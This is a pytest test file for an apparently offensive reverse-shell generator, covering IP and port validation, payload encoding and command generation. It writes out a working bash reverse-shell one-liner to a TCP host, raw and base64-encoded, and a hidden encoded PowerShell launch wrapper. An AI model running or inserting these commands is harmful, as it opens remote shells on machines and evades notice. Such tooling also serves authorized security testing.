from __future__ import annotations

import base64

import pytest

from revshell_gen.generator import (
    Encoding,
    InvalidIPError,
    InvalidPortError,
    encode,
    generate,
    validate_ip,
    validate_port,
)
from revshell_gen.templates import find

BASH_TEMPLATE = find("bash-tcp")


def test_render_substitutes_ip_and_port():
    command = BASH_TEMPLATE.render(ip="10.10.10.1", port=4444)
    assert "10.10.10.1" in command
    assert "4444" in command


@pytest.mark.parametrize("port", [0, -1, 65536, 100000])
def test_validate_port_rejects_out_of_range(port):
    with pytest.raises(InvalidPortError):
        validate_port(port)


@pytest.mark.parametrize("port", [1, 80, 4444, 65535])
def test_validate_port_accepts_valid_range(port):
    validate_port(port)  # should not raise


def test_validate_ip_accepts_ipv4():
    validate_ip("192.168.1.1")


def test_validate_ip_accepts_ipv6():
    validate_ip("::1")


def test_validate_ip_accepts_hostname():
    validate_ip("attacker.example.local")


def test_validate_ip_rejects_empty():
    with pytest.raises(InvalidIPError):
        validate_ip("")


def test_validate_ip_rejects_spaces():
    with pytest.raises(InvalidIPError):
        validate_ip("not a valid host")


def test_encode_raw_is_identity():
    assert encode("echo hi", Encoding.RAW) == "echo hi"


def test_encode_url():
    assert encode("a b", Encoding.URL) == "a%20b"


def test_encode_url_double():
    once = encode("a b", Encoding.URL)
    twice = encode(once, Encoding.URL)
    assert encode("a b", Encoding.URL_DOUBLE) == twice


def test_encode_base64_roundtrip():
    encoded = encode("hello world", Encoding.BASE64)
    assert base64.b64decode(encoded).decode() == "hello world"


def test_encode_powershell_base64_wraps_command():
    encoded = encode("whoami", Encoding.POWERSHELL_BASE64)
    assert encoded.startswith("powershell -NoP -NonI -W Hidden -Enc ")
    b64_part = encoded.rsplit(" ", 1)[-1]
    assert base64.b64decode(b64_part).decode("utf-16-le") == "whoami"


def test_generate_end_to_end_raw():
    command = generate(BASH_TEMPLATE, "10.10.10.1", 4444, Encoding.RAW)
    assert command == "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"


def test_generate_end_to_end_base64():
    command = generate(BASH_TEMPLATE, "10.10.10.1", 4444, Encoding.BASE64)
    decoded = base64.b64decode(command).decode()
    assert decoded == "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"


def test_generate_rejects_invalid_port():
    with pytest.raises(InvalidPortError):
        generate(BASH_TEMPLATE, "10.10.10.1", 99999, Encoding.RAW)


def test_generate_rejects_invalid_ip():
    with pytest.raises(InvalidIPError):
        generate(BASH_TEMPLATE, "not an ip", 4444, Encoding.RAW)
